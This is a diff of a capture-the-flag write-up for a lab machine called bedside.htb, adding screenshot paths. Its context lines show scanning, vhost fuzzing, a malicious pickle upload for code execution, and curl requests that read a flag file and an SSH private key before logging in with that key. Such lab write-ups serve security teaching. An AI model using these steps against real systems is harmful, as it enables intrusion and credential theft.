@@ -39,6 +39,9 @@ nmap -sCV -p22,80,3000 -Pn -oN services.txt 10.129.14.113
 
 Port 80 redirects to `bedside.htb`, so add the host and fuzz for vhosts:
 
+/home/z0n/z0n/z0n/posts/Beside/htb_beside_web.png
+
+
 ```bash
 echo "10.129.14.113 bedside.htb research.bedside.htb" | sudo tee -a /etc/hosts
 ffuf -u http://bedside.htb/ -H "Host: FUZZ.bedside.htb" \
@@ -47,7 +50,13 @@ ffuf -u http://bedside.htb/ -H "Host: FUZZ.bedside.htb" \
 # -> research.bedside.htb
 ```
 
+/home/z0n/z0n/z0n/posts/Beside/htb_beside_dom_sub.png
+
 `bedside.htb` is a static "clinic" site. **`research.bedside.htb`** is the interesting one - a **file‑upload portal** whose response header advertises the tech:
+
+
+/home/z0n/z0n/z0n/posts/Beside/htb_beside_researchweb.png
+
 
 ```
 X-Powered-By: pdfminer.six
@@ -227,6 +236,10 @@ endobj
 
 Upload `evil.pickle.gz`, then the PDF. A background worker picks it up.
 
+/home/z0n/z0n/z0n/posts/Beside/htb_beside_upload_evil.png
+
+
+
 ### What actually runs it
 
 Foothold lands as **`datawrangler`** on host `data-wrangler`. The processor is `/app/pdf_watcher.py`:
@@ -275,17 +288,25 @@ curl -s "http://127.0.0.1:3000/${T}home/developer/user.txt"         # USER FLAG
 curl -s "http://127.0.0.1:3000/${T}home/developer/.ssh/id_ed25519"  # SSH key
 ```
 
+/home/z0n/z0n/z0n/posts/Beside/htb_beside_trigger_dev_kept.png
+
+
 The `/etc/passwd` read confirms the real user `developer:x:1000:1000:...:/home/developer:/bin/bash`, and the private key matches `authorized_keys`. SSH straight in:
 
 ```bash
 ssh -i developer_key developer@10.129.14.113     # user owned
 ```
 
+/home/z0n/z0n/z0n/posts/Beside/htb_beside_usr_flag.png
 
 
 ## Root - MONAI `CheckpointLoader` -> `torch.load` pickle RCE
 
 `sudo -l` as `developer`:
+
+
+/home/z0n/z0n/z0n/posts/Beside/htb_beside_sudo.png
+
 
 ```
 User developer may run the following commands on bedside:
